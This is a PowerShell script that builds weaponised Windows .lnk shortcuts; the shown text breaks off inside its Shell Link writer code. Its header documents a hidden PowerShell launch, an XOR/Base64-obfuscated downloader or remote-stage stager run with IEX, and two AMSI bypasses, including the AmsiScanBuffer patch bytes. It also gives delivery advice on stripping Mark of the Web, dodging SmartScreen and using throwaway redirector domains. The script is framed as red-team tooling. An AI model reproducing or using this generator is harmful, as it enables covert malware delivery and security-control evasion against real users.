#requires -Version 5.1
<#
    New-AgentShortcut.ps1

    ONE UNIFIED SCRIPT built from two sources:

      PART 1  ShellLink.ps1                      (authoritative)
              Standards-oriented raw-binary Microsoft Shell Link (.lnk)
              writer + independent binary validator. Every byte written to a
              .lnk by this script is produced by PART 1's Write-ShellLink and
              then re-parsed by PART 1's Validate-ShellLink.

      PART 2  New-AgentShortcut.ps1              (higher-level generator)
              Command-line interface, payload construction, XOR + Base64
              obfuscation, stub assembly, -EncodedCommand encoding and the
              .lnk generation workflow. Its old hand-written .lnk writer is
              DELETED - there is exactly one raw Shell Link implementation in
              this file (PART 1).

    What the produced shortcut does when double-clicked:
      1. launches a HIDDEN powershell.exe (no visible window)
      2. that process reconstructs the install command IN MEMORY from an
         obfuscated blob (XOR + Base64, fresh random key per generation)
      3. [optional] the FIRST statement of the decoded script neutralises
         AMSI. Two OPT-IN forms (see below):
            LIGHT (-AlsoAmsi): reflection flip of the
               AmsiUtils.amsiInitFailed flag only. No Add-Type, no
               VirtualProtect, no patch bytes written anywhere -> the
               decoded text carries almost no AMSI-bypass signature.
            FULL (-AmsiPatch): light + in-memory byte patch of
               amsi.dll!AmsiScanBuffer (mov eax,0x80070057; ret) behind
               VirtualProtect, then restore the page protection. Same two
               layers as the original generator, retained for A/B use.
      4. it downloads the agent to $env:TEMP and silently starts the installer
         (or, with -RemoteStage, fetches a malicious SECOND stage script from
         a redirector at runtime - the .lnk itself then carries only a compact
         stager instead of the full downloader)
      5. process exits

    AMSI integration note:
      The AMSI/evasion stage is an explicitly separated, OPT-IN stage. It is
      never embedded in the default generator output; it ships only when the
      test interface requests it (-TestPayload -AlsoAmsi, or -AlsoAmsi /
      -AmsiPatch with a real payload). This keeps the default generation path
      free of an embedded security-control bypass while preserving the A/B
      test workflow.

    OPERATIONAL PRE-FLIGHT (delivery hygiene - the largest real-world
    determinant, no code needed):
      1. MARK OF THE WEB: any .lnk that crosses the internet carries
         Zone.Identifier. Modern Windows + Defender aggressively BLOCK
         shortcuts with MOTW that invoke script hosts (often before AV even
         runs). Strip/neutralise MOTW during delivery (archive via a method
         that does not propagate the zone, or IRM-stamp in scope) or the
         shortcut will not run.
      2. SMARTSCREEN / REPUTATION: freshly generated unsigned .lnk files get
         cloud reputation checks. Deliver through a channel your assessment
         controls; expect UnknownPublisher warnings on new hosts.
      3. INFRASTRUCTURE: use short-lived domains/redirectors; stand the
         redirector up AFTER generation, tear it down immediately after the
         run. With -RemoteStage the redirector must return raw PowerShell
         (text/plain is fine; stage the body to avoid an HTML wrapper).
      4. LAYER-4 RESIDUE BUDGET: "hidden powershell -> network -> child
         process" is observable to any host with ScriptBlock Logging or an
         EDR, regardless of the artifact's static surface. Scope success to
         "the artifact isn't flagged at rest / passes the first scan" unless
         the assessment explicitly requires an unobserved run.

    Obfuscation (what it does / does not do):
      - The .lnk carries ONLY the stub (key + ciphertext). The endpoint URL,
        installer filename, the AMSI-bypass identifiers (AmsiUtils,
        AmsiScanBuffer, amsiInitFailed), and the raw patch bytes never appear
        in plaintext anywhere in the artifact.
      - The decoded logic itself is built with fragmentary literals
        ('Amsi' + 'Utils', 'amsiInit' + 'Failed') so the classic detection
        signatures are never contiguous in the text AMSI scans either.
      - This deters casual eyeballing and simple string-scanning.
      - It is NOT encryption. The key ships in the same artifact, so a
        determined analyst, AMSI, or ScriptBlock Logging recovers the URL at
        runtime. Obfuscation != secret protection. See footer notes.
======================= PROVENANCE =======================
    PART 1 (from ShellLink.ps1, embedded VERBATIM unless noted):
      Header/CLSID/flag constants, byte primitives, file I/O, UTF-16LE/ANSI
      string encoding, StringData serialisation, Windows path helpers,
      VolumeID, LinkInfo writer + parser, ShellLinkHeader writer + parser,
      LinkTargetIDList parser, ExtraData parser, Write-ShellLink,
      Validate-ShellLink, and the Test-ShellLinkWriter self-test suite.
      Deltas from the source text (all documented inline at the site):
        a) StringData 260-character cap is superseded by
           $script:STRINGDATA_MAX_CHARACTERS (0x7FFF). The Arguments block
           must carry a full -EncodedCommand (~1500-4000 chars) exactly like
           Windows Explorer writes long COMMAND_LINE_ARGUMENTS; the on-disk
           layout is unchanged.
        b) Throw-ShellLinkError constructs the exception with New-Object
           (powershell-7-only '::new' constructor syntax is avoided) and uses
           System.ArgumentException (the System.InvalidDataException type is
           not resolvable on every PowerShell runtime), so the error path is
           Windows PowerShell 5.1-safe.
        c) The standalone 'if ($args -contains "-SelfTest")' CLI block is
           replaced by the unified -SelfTest switch in PART 2.
        d) Write-ShellLink now also emits a LinkTargetIDList (file-system
           PIDL) for drive-rooted ASCII file targets. Windows resolves a
           shortcut's TargetPath (IShellLink::GetPath / WScript.Shell
           Shortcut.TargetPath) from that IDList; a LinkInfo-only .lnk leaves
           TargetPath empty. See New-LinkTargetIDList / ConvertFrom-
           LinkTargetIDList and the PART 2 target-resolution block.
    PART 2 (from New-AgentShortcut.ps1):
      param() command-line interface, input sanity checks, payload
      construction, XOR + Base64 obfuscation stage, stub
      assembly, -EncodedCommand UTF-16LE encoding, plaintext-leak +
      round-trip verification, -ShowLogic review output, -ComWriter
      comparison path (Windows-only, unchanged), footer notes and final flow
      reporting.
      INTEGRATION ADDITIONS (ROI/evasion session - new OPT-IN switches and
      defaults, no change to the Shell Link binary layout):
        + -AlsoAmsi is now the LIGHT AMSI stage (reflection flip of
          AmsiUtils.amsiInitFailed only - no Add-Type, no patch bytes).
        + -AmsiPatch (new) is the FULL two-layer AMSI stage (light + the
          in-memory amsi.dll!AmsiScanBuffer byte patch used by the original
          generator).
        + -RemoteStage (new) embeds only a compact stager (URL + fetch-and-
          IEX) in the .lnk; the real stage-2 body is fetched from a
          redirector at runtime.
        + Arguments use the -Enc alias of -EncodedCommand and no longer
          carry -ExecutionPolicy Bypass (ROI item 2: the canonical static
          token stack is gone; payload delivery is unchanged).

    ======================= COMPATIBILITY CHECKLIST =======================
      [X] Windows PowerShell 5.1     - no '::new' ctor syntax; no $IsWindows;
                                        New-Object ctor calls; runtime-specific
                                        .NET behaviour isolated in small
                                        compatibility functions
                                        (Move-FileAtomicCompatible,
                                        New-Object FileStream, ...);
                                        atomic overwrite via File.Replace.
                                        Hex masks use decimal/Convert forms
                                        (raw 0x80000000+ literals are negative
                                        Int32 on some runtimes); -f arguments
                                        are never split over backtick lines;
                                        empty byte arrays never cross a typed
                                        function boundary (pipeline flattens
                                        them to $null / binder refuses them).
                                        -Enc is the standard alias of
                                        -EncodedCommand on powershell.exe
                                        (works in 5.1 and 7).
      [X] PowerShell 7 on Windows    - same code paths as 5.1; verified API
                                        surface incl.
                                        [System.Environment]::OSVersion.
      [X] PowerShell 7 on Linux      - verified end-to-end under PowerShell
                                        7.6.5 / Linux: self-test suite
                                        (47/47), native .lnk generation,
                                        post-write Validate-ShellLink,
                                        XOR-stub decode of all three payload
                                        modes.
      [X] PowerShell 7 on macOS      - identical non-Windows code path as
                                        Linux (Windows-only calls live only in
                                        the -ComWriter branch).

    ======================= GENERATION FLOW =======================
        generator (PART 2 CLI)
          -> payload construction       (Marker / Notepad / Both / downloader);
                                        optional AMSI stage only with -AlsoAmsi
          -> encoding/obfuscation stage (XOR, fresh random key + Base64)
          -> stub assembly              (key + ciphertext only)
          -> -EncodedCommand            (UTF-16LE + Base64, round-trip checked)
          -> Shell Link specification   (TargetPath, Description, RelativePath,
                                         WorkingDirectory, Arguments,
                                         IconLocation, ShowCommand)
          -> Write-ShellLink            (PART 1 raw binary writer)
          -> write .lnk                 (atomic file replacement)
          -> Validate-ShellLink         (PART 1 strict binary re-parse)
          -> final verification         (target exe, -EncodedCommand in
                                         Arguments, icon location, byte-for-byte
                                         StringData, LinkInfo reconstruction,
                                         TerminalBlock, structural validity)
Usage:
      .\New-AgentShortcut.ps1 -URL "https://your.host/clients/xxx/deploy/" `
                              -Output "C:\Users\Public\Update.lnk" `
                              -FileName "trmm-agent.exe" `
                              -ShowLogic

      A/B the AMSI / staging variants:
        -AlsoAmsi    light AMSI reflection flip only (low signature)
        -AmsiPatch   full two-layer bypass (reflection + in-memory byte patch)
        -RemoteStage embed only a compact stager (URL + IEX remote script) -
                     host the real stage-2 payload on a redirector

    Debugging the .lnk mechanics (safe / benign):
      Generate a shortcut whose inner payload is INERT (marker file / Notepad)
      but which travels the exact same chain
         .lnk -> hidden powershell -> -EncodedCommand -> Base64 -> XOR -> IEX:
       1) .\New-AgentShortcut.ps1 -TestPayload -TestAction Marker `
                                  -Output "C:\Users\Public\Debug-Marker.lnk"
       2) double-click on the Windows box, wait a few seconds,
          then check %TEMP%\lnk_chain_debug.txt
            - marker present  => the .lnk chain is healthy; the failure is in
              the downloader/AMSI steps (see footer, DEBUGGING report)
            - no marker       => the chain itself is broken; work the footer's
              DEBUGGING checklist in order
       3) A/B the AMSI stage: rerun step 1 WITH -AlsoAmsi (light reflection flip)
          or -AmsiPatch (full two-layer). If plain test works and test+AMSI
          does not, the bypass is what trips the endpoint (killed process, no
          marker). Then isolate the downloader the same way.
      -TestAction Notepad / Both -> launch notepad.exe instead / as well.
      Cross-check the writer: add -ComWriter (Windows only) to build the .lnk
      with WScript.Shell COM (real LinkTargetIDList) and compare behaviour.
      On the generator box you can also replay the .lnk's encoded command
      directly: powershell -File .\Debug-LnkChain.ps1 -LnkPath ...\.lnk
      (see Debug-LnkChain.ps1 for -Replay).

    Built-in Shell Link self-test (Part 1 suite, callable after integration):
        pwsh ./New-AgentShortcut.ps1 -SelfTest
      -Output is not required when -SelfTest is given. The suite runs
      independently of payload generation and exercises the raw writer and the
      strict binary validator end to end.

    AMSI note:
      - Two-layer bypass, executed as the FIRST statements of the decoded
        script. Targets Windows PowerShell 5.1 (what the .lnk invokes):
          1) in-memory byte patch of amsi.dll!AmsiScanBuffer:
               VirtualProtect -> PAGE_EXECUTE_READWRITE, write the 6-byte
               stub 'mov eax,0x80070057; ret' (B8 57 00 07 80 C3), restore
               the old protection. E_INVALIDARG makes AMSI treat every
               scan as "no result". The bytes are assembled from a
               BitConverter call (never the literal hex sequence), and the
               API name is pieced together ('Amsi'+'Scan'+'Buffer') so no
               classic scanner signature exists contiguously anywhere.
          2) reflection flip of AmsiUtils.amsiInitFailed = $true
               (known-good baseline; fails quietly if the type is gone)
      - It is a DETECTION-EVASION technique -> sanctioned red-team / pentest /
        lab use only. It does not defeat a hardened EDR, ASR rules,
        AppLocker, or an AMSI that moves the scan out-of-process; ScriptBlock
        Logging still records the fully-decoded activity.
#>
param(
    [string]$URL,                          # direct download URL of the installer binary (required unless -TestPayload)

    [string]$Output,                       # full path of the .lnk to create (required at generation time; optional only for -SelfTest)

    [string]$FileName = "trmm-agent.exe",  # local name saved under $env:TEMP

    [string]$InstallCmd,                   # OPT-IN (STAGE 1 / ZIP): resolved enrollment command to append
                                           #   to the embedded downloader so the .lnk downloads AND enrolls
                                           #   (FINDING 2 fix). When empty/absent the downloader keeps its
                                           #   original download + silent-install behaviour only.
    [string]$AuthToken,                    # OPT-IN: resolved per-device auth token. Never embedded in
                                           #   plaintext — only added to the plaintext-leak self-check as a
                                           #   needle (see PART 2 verification). Empty for the default path.

    [string]$Icon = "C:\Windows\System32\imageres.dll,48",

    [switch]$ShowLogic,                    # print the plaintext inner logic for review

    # ---- DEBUGGING MODE (see header comment, section "Debugging the .lnk mechanics") ----
    # Ship a BENIGN inner payload through the exact same
    #   .lnk -> hidden powershell -> -EncodedCommand -> Base64 -> XOR -> Invoke-Expression
    # chain, so we can prove/disprove that the CHAIN is the problem, independently
    # of the downloader and the AMSI patch.
    [switch]$TestPayload,                  # DEBUG: replace inner payload with marker-file/Notepad logic
    [ValidateSet('Marker', 'Notepad', 'Both')]
    [string]$TestAction = 'Marker',        # DEBUG: what the benign payload does
    [switch]$AlsoAmsi,                     # OPT-IN AMSI/evasion stage, LIGHT form:
                                           #   reflection flip of amsiInitFailed only
                                           #   (no Add-Type, no patch bytes -> low signature)
    [switch]$AmsiPatch,                    # OPT-IN AMSI/evasion stage, FULL form:
                                           #   reflection flip + in-memory amsi.dll
                                           #   AmsiScanBuffer byte patch (same as the
                                           #   original two-layer bypass). Use for A/B
                                           #   when the light form is ineffective.
    [switch]$RemoteStage,                  # OPT-IN server-side staging: the .lnk embeds
                                           #   only a compact stager (URL + IEX of a
                                           #   remote script) instead of the full
                                           #   downloader; the malicious stage lives on
                                           #   the redirector and is fetched at runtime.

    # Writer selection. Default = PART 1's pure-PowerShell byte-level
    # MS-SHORTCUT writer (works on Linux pwsh AND Windows PowerShell).
    # -ComWriter = classic WScript.Shell COM (Windows only, writes a native
    # .lnk WITH a real LinkTargetIDList) - keep it as a cross-check if
    # Explorer ever refuses to resolve a native-writer shortcut.
    [switch]$ComWriter,

    # ---- launcher mode (WP4): relative-target shortcut for Launcher.exe ----
    # When -LauncherMode is given the .lnk targets a RELATIVE 'Launcher.exe'
    # sitting next to it, with NO command-line arguments (the launcher carries
    # the encrypted payload; nothing is downloaded at runtime). WorkingDirectory
    # is left empty so Explorer starts the process in the shortcut's own folder.
    # The entire powershell -Enc / IEX / downloader pipeline is SKIPPED.
    [string]$LauncherTarget = 'Launcher.exe',  # bare relative file name (no path)
    [string]$LauncherTag = '',                 # per-build nonce mixed into the Description -> byte-unique .lnk per build
    [switch]$LauncherMode,                     # write a launcher-mode .lnk that runs Launcher.exe (relative/absolute)
    [switch]$PowershellBridge,                 # Update.lnk -> OS PowerShell -> Start-Process .\<sub>\Launcher.exe -Verb RunAs (portable, no baked path)
    [string]$LauncherSubFolder = 'launcher',   # subfolder (relative to the .lnk) that holds Launcher.exe + agent.bin

    # ---- Validation report card (WP6, invoked server-side after a launcher build) ----
    [switch]$Validate,                         # run the launcher-artifact report card and exit
    [string]$LnkPath,                          # .lnk to inspect (with -Validate)
    [string]$LauncherExePath,                  # stamped Launcher.exe to inspect (with -Validate)

    [switch]$SelfTest                      # run PART 1's Test-ShellLinkWriter suite and exit
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

# ============================================================================
# PART 1   Shell Link component
#          (embedded verbatim from ShellLink.ps1 - the AUTHORITATIVE Shell
#          Link implementation; see the three documented deltas above)
# ============================================================================
# ============================================================================
# Platform / runtime
# ============================================================================

# Do not use PowerShell-7-only automatic variables such as $IsWindows.
# Environment.OSVersion.Platform exists in Windows PowerShell 5.1 and
# PowerShell 7 across Windows/Linux/macOS.
$script:IsWindowsPlatform = (
    [System.Environment]::OSVersion.Platform -eq
    [System.PlatformID]::Win32NT
)

# ============================================================================
# Constants
# ============================================================================

$script:SHELL_LINK_HEADER_SIZE = 0x4C

# LinkCLSID:
#     00021401-0000-0000-C000-000000000046
#
# The Shell Link file stores the first three GUID fields little-endian.
[byte[]]$script:SHELL_LINK_CLSID = @(
    0x01, 0x14, 0x02, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0xC0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x46
)
# ---------------------------------------------------------------------------
# LinkFlags
# ---------------------------------------------------------------------------

$script:FLAG_HAS_IDLIST                    = [uint32]0x00000001
$script:FLAG_HAS_LINKINFO                  = [uint32]0x00000002
$script:FLAG_HAS_NAME                      = [uint32]0x00000004
$script:FLAG_HAS_RELATIVE_PATH             = [uint32]0x00000008
$script:FLAG_HAS_WORKING_DIR               = [uint32]0x00000010
$script:FLAG_HAS_ARGUMENTS                 = [uint32]0x00000020
$script:FLAG_HAS_ICON_LOCATION             = [uint32]0x00000040
$script:FLAG_IS_UNICODE                    = [uint32]0x00000080
$script:FLAG_FORCE_NO_LINKINFO             = [uint32]0x00000100
$script:FLAG_HAS_EXP_STRING                = [uint32]0x00000200
$script:FLAG_RUN_IN_SEPARATE_PROCESS       = [uint32]0x00000400
$script:FLAG_UNUSED1                       = [uint32]0x00000800
$script:FLAG_HAS_DARWIN_ID                 = [uint32]0x00001000
$script:FLAG_RUN_AS_USER                   = [uint32]0x00002000
$script:FLAG_HAS_EXP_ICON                  = [uint32]0x00004000
$script:FLAG_NO_PIDL_ALIAS                 = [uint32]0x00008000
$script:FLAG_UNUSED2                       = [uint32]0x00010000
$script:FLAG_RUN_WITH_SHIM_LAYER           = [uint32]0x00020000
$script:FLAG_FORCE_NO_LINK_TRACK           = [uint32]0x00040000
$script:FLAG_ENABLE_TARGET_METADATA        = [uint32]0x00080000
$script:FLAG_DISABLE_LINK_PATH_TRACKING    = [uint32]0x00100000
$script:FLAG_DISABLE_KNOWN_FOLDER_TRACKING = [uint32]0x00200000
$script:FLAG_DISABLE_KNOWN_FOLDER_ALIAS    = [uint32]0x00400000
$script:FLAG_ALLOW_LINK_TO_LINK            = [uint32]0x00800000
$script:FLAG_UNALIAS_ON_SAVE               = [uint32]0x01000000
$script:FLAG_PREFER_ENVIRONMENT_PATH       = [uint32]0x02000000
$script:FLAG_KEEP_LOCAL_IDLIST_FOR_UNC     = [uint32]0x04000000

# Bits 27..31 are outside the defined LinkFlags structure.
$script:LINKFLAGS_UNDEFINED_MASK = [uint32][Convert]::ToUInt32('F8000000', 16)
# ---------------------------------------------------------------------------
# FileAttributesFlags
# ---------------------------------------------------------------------------

$script:FILE_ATTR_READONLY            = [uint32]0x00000001
$script:FILE_ATTR_HIDDEN              = [uint32]0x00000002
$script:FILE_ATTR_SYSTEM              = [uint32]0x00000004
$script:FILE_ATTR_DIRECTORY           = [uint32]0x00000010
$script:FILE_ATTR_ARCHIVE             = [uint32]0x00000020
$script:FILE_ATTR_NORMAL              = [uint32]0x00000080
$script:FILE_ATTR_TEMPORARY           = [uint32]0x00000100
$script:FILE_ATTR_SPARSE_FILE         = [uint32]0x00000200
$script:FILE_ATTR_REPARSE_POINT       = [uint32]0x00000400
$script:FILE_ATTR_COMPRESSED          = [uint32]0x00000800
$script:FILE_ATTR_OFFLINE             = [uint32]0x00001000
$script:FILE_ATTR_NOT_CONTENT_INDEXED = [uint32]0x00002000
$script:FILE_ATTR_ENCRYPTED           = [uint32]0x00004000

$script:FILE_ATTR_RESERVED_MASK  = [uint32]0x00000048
$script:FILE_ATTR_UNDEFINED_MASK = [uint32][Convert]::ToUInt32('FFFF8000', 16)
# ---------------------------------------------------------------------------
# LinkInfo
# ---------------------------------------------------------------------------

$script:LINKINFO_HEADER_LEGACY  = 0x1C
$script:LINKINFO_HEADER_UNICODE = 0x24

$script:LINKINFO_FLAG_VOLUME_AND_LOCAL      = [uint32]0x00000001
$script:LINKINFO_FLAG_NETWORK_AND_SUFFIX    = [uint32]0x00000002
$script:LINKINFO_UNDEFINED_MASK             = [uint32][Convert]::ToUInt32('FFFFFFFC', 16)

# ---------------------------------------------------------------------------
# VolumeID DriveType
# ---------------------------------------------------------------------------

$script:DRIVE_UNKNOWN   = [uint32]0
$script:DRIVE_NO_ROOT   = [uint32]1
$script:DRIVE_REMOVABLE = [uint32]2
$script:DRIVE_FIXED     = [uint32]3
$script:DRIVE_REMOTE    = [uint32]4
$script:DRIVE_CDROM     = [uint32]5
$script:DRIVE_RAMDISK   = [uint32]6

# ---------------------------------------------------------------------------
# CommonNetworkRelativeLink flags
# ---------------------------------------------------------------------------

$script:CNRL_VALID_DEVICE  = [uint32]0x00000001
$script:CNRL_VALID_NETTYPE = [uint32]0x00000002
$script:CNRL_UNDEFINED_MASK = [uint32][Convert]::ToUInt32('FFFFFFFC', 16)

# ---------------------------------------------------------------------------
# ExtraData signatures
# ---------------------------------------------------------------------------

$script:EXTRA_ENVIRONMENT      = [uint32][Convert]::ToUInt32('A0000001', 16)
$script:EXTRA_CONSOLE          = [uint32][Convert]::ToUInt32('A0000002', 16)
$script:EXTRA_TRACKER          = [uint32][Convert]::ToUInt32('A0000003', 16)
$script:EXTRA_CONSOLE_FE       = [uint32][Convert]::ToUInt32('A0000004', 16)
$script:EXTRA_SPECIAL_FOLDER   = [uint32][Convert]::ToUInt32('A0000005', 16)
$script:EXTRA_DARWIN           = [uint32][Convert]::ToUInt32('A0000006', 16)
$script:EXTRA_ICON_ENVIRONMENT = [uint32][Convert]::ToUInt32('A0000007', 16)
$script:EXTRA_SHIM             = [uint32][Convert]::ToUInt32('A0000008', 16)
$script:EXTRA_PROPERTY_STORE   = [uint32][Convert]::ToUInt32('A0000009', 16)
$script:EXTRA_KNOWN_FOLDER     = [uint32][Convert]::ToUInt32('A000000B', 16)
$script:EXTRA_VISTA_IDLIST     = [uint32][Convert]::ToUInt32('A000000C', 16)
# ============================================================================
# Error helper
# ============================================================================

function Throw-ShellLinkError {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    # Integration delta (documented): '::new' is PowerShell-7-only constructor
    # syntax, and the custom System.InvalidDataException type is not resolvable
    # on every PowerShell runtime. New-Object + System.ArgumentException behaves
    # identically on Windows PowerShell 5.1 and PowerShell 7 across OSes and is
    # caught by the same catch{} paths.
    throw (New-Object 'System.ArgumentException' -ArgumentList @($Message))
}
# ============================================================================
# Byte primitives
# ============================================================================

function New-ByteList {
    return New-Object 'System.Collections.Generic.List[byte]'
}

function Write-U16 {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Buffer,

        [Parameter(Mandatory = $true)]
        [uint16]$Value
    )

    $Buffer.Add([byte]($Value -band 0xFF))
    $Buffer.Add([byte](($Value -shr 8) -band 0xFF))
}

function Write-U32 {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Buffer,

        [Parameter(Mandatory = $true)]
        [uint32]$Value
    )

    $Buffer.Add([byte]($Value -band 0xFF))
    $Buffer.Add([byte](($Value -shr 8) -band 0xFF))
    $Buffer.Add([byte](($Value -shr 16) -band 0xFF))
    $Buffer.Add([byte](($Value -shr 24) -band 0xFF))
}

function Write-U64 {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Buffer,

        [Parameter(Mandatory = $true)]
        [uint64]$Value
    )

    for ($i = 0; $i -lt 8; $i++) {
        $Buffer.Add(
            [byte](($Value -shr (8 * $i)) -band 0xFF)
        )
    }
}
function Read-U16 {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 2 `
        -What 'UInt16'

    [uint16]$v = 0
    $v = $v -bor [uint16]$Bytes[$Offset]
    $v = $v -bor ([uint16]$Bytes[$Offset + 1] -shl 8)

    return $v
}

function Read-U32 {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 4 `
        -What 'UInt32'

    [uint32]$v = 0
    $v = $v -bor [uint32]$Bytes[$Offset]
    $v = $v -bor ([uint32]$Bytes[$Offset + 1] -shl 8)
    $v = $v -bor ([uint32]$Bytes[$Offset + 2] -shl 16)
    $v = $v -bor ([uint32]$Bytes[$Offset + 3] -shl 24)

    return $v
}

function Read-U64 {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 8 `
        -What 'UInt64'

    [uint64]$v = 0

    for ($i = 0; $i -lt 8; $i++) {
        $part = [uint64]$Bytes[$Offset + $i]
        $v = $v -bor ($part -shl (8 * $i))
    }

    return $v
}

function Set-U16 {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [uint16]$Value
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 2 `
        -What 'Set-U16'

    $Bytes[$Offset] = [byte]($Value -band 0xFF)
    $Bytes[$Offset + 1] = [byte](($Value -shr 8) -band 0xFF)
}

function Set-U32 {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [uint32]$Value
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length 4 `
        -What 'Set-U32'

    $Bytes[$Offset] = [byte]($Value -band 0xFF)
    $Bytes[$Offset + 1] = [byte](($Value -shr 8) -band 0xFF)
    $Bytes[$Offset + 2] = [byte](($Value -shr 16) -band 0xFF)
    $Bytes[$Offset + 3] = [byte](($Value -shr 24) -band 0xFF)
}
function Assert-ByteRange {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [int]$Length,

        [string]$What = 'byte range'
    )

    if ($Offset -lt 0) {
        Throw-ShellLinkError "$What begins before the start of the file."
    }

    if ($Length -lt 0) {
        Throw-ShellLinkError "$What has a negative size."
    }

    if ($Offset -gt $Bytes.Length) {
        Throw-ShellLinkError "$What begins beyond the end of the file."
    }

    if ($Length -gt ($Bytes.Length - $Offset)) {
        Throw-ShellLinkError "$What extends beyond the end of the file."
    }
}

function Copy-Bytes {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes
    )

    [byte[]]$copy = New-Object byte[] $Bytes.Length

    if ($Bytes.Length -gt 0) {
        [System.Array]::Copy(
            $Bytes,
            0,
            $copy,
            0,
            $Bytes.Length
        )
    }

    return $copy
}

function Slice-Bytes {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [int]$Length
    )

    Assert-ByteRange `
        -Bytes $Bytes `
        -Offset $Offset `
        -Length $Length `
        -What 'byte slice'

    [byte[]]$result = New-Object byte[] $Length

    if ($Length -gt 0) {
        [System.Array]::Copy(
            $Bytes,
            $Offset,
            $result,
            0,
            $Length
        )
    }

    return $result
}

function Join-ByteArrays {
    param(
        [Parameter(Mandatory = $true)]
        [object[]]$Arrays
    )

    [int64]$total = 0

    foreach ($array in $Arrays) {
        if ($null -ne $array) {
            $total += ([byte[]]$array).Length
        }
    }

    if ($total -gt [int32]::MaxValue) {
        Throw-ShellLinkError `
            "Combined Shell Link exceeds the maximum .NET byte-array size."
    }

    [byte[]]$result = New-Object byte[] ([int]$total)

    [int]$position = 0

    foreach ($array in $Arrays) {
        if ($null -eq $array) {
            continue
        }

        [byte[]]$part = [byte[]]$array

        if ($part.Length -gt 0) {
            [System.Array]::Copy(
                $part,
                0,
                $result,
                $position,
                $part.Length
            )

            $position += $part.Length
        }
    }

    return $result
}
# ============================================================================
# File I/O
# ============================================================================

function Read-AllBytes {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if (-not [System.IO.File]::Exists($Path)) {
        Throw-ShellLinkError "File not found: $Path"
    }

    return [System.IO.File]::ReadAllBytes($Path)
}

function Ensure-Directory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrEmpty($Path)) {
        return
    }

    if (-not [System.IO.Directory]::Exists($Path)) {
        [System.IO.Directory]::CreateDirectory($Path) | Out-Null
    }
}

function Move-FileAtomicCompatible {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Source,

        [Parameter(Mandatory = $true)]
        [string]$Destination
    )

    if ([System.IO.File]::Exists($Destination)) {

        if ($script:IsWindowsPlatform) {

            # File.Replace(source,destination,backup,ignoreMetadataErrors)
            # exists on the .NET Framework used by Windows PowerShell 5.1
            # and remains available on modern .NET Windows runtimes.
            [System.IO.File]::Replace(
                $Source,
                $Destination,
                $null,
                $true
            )
        }
        else {

            # The overwrite overload is available in modern .NET used by
            # PowerShell 7 on Linux/macOS. Do not call it on .NET Framework.
            try {
                [System.IO.File]::Move(
                    $Source,
                    $Destination,
                    $true
                )
            }
            catch {
                Throw-ShellLinkError `
                    "Unable to replace existing destination '$Destination' on this runtime."
            }
        }
    }
    else {
        # Two-argument File.Move exists on both .NET Framework and modern .NET.
        [System.IO.File]::Move(
            $Source,
            $Destination
        )
    }
}
function Write-AllBytesAtomic {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [Parameter(Mandatory = $true)]
        [byte[]]$Bytes
    )

    $fullPath = [System.IO.Path]::GetFullPath($Path)
    $directory = [System.IO.Path]::GetDirectoryName($fullPath)

    if ([string]::IsNullOrEmpty($directory)) {
        $directory = [System.IO.Directory]::GetCurrentDirectory()
    }

    Ensure-Directory -Path $directory

    $fileName = [System.IO.Path]::GetFileName($fullPath)

    $tempPath = [System.IO.Path]::Combine(
        $directory,

        # NOTE: keep the -f format AND its argument list on one line inside the
        # parenthesis. On some PowerShell runtimes, splitting an -f argument
        # list across backtick-continuation lines leaves the operator with a
        # single argument and raises 'Error formatting a string' ({1} missing).
        (
            '.{0}.{1}.tmp' -f $fileName, ([System.Guid]::NewGuid().ToString('N'))
        )
    )

    try {

        # Use New-Object -ArgumentList rather than constructor syntax that can
        # be parsed differently by older PowerShell hosts.
        $stream = New-Object `
            -TypeName System.IO.FileStream `
            -ArgumentList @(
                $tempPath,
                [System.IO.FileMode]::CreateNew,
                [System.IO.FileAccess]::Write,
                [System.IO.FileShare]::None
            )

        try {

            if ($Bytes.Length -gt 0) {
                $stream.Write(
                    $Bytes,
                    0,
                    $Bytes.Length
                )
            }

            # Flush(bool) is available on the .NET Framework versions used by
            # Windows PowerShell 5.1 and modern .NET.
            $stream.Flush($true)
        }
        finally {
            $stream.Dispose()
        }

        Move-FileAtomicCompatible `
            -Source $tempPath `
            -Destination $fullPath
    }
    finally {

        if ([System.IO.File]::Exists($tempPath)) {

            Remove-Item `
                -LiteralPath $tempPath `
                -Force `
                -ErrorAction SilentlyContinue
        }
    }

    return $Bytes.Length
}
# ============================================================================
# String encoding
# ============================================================================

function ConvertTo-Utf16Le {
    param(
        [AllowNull()]
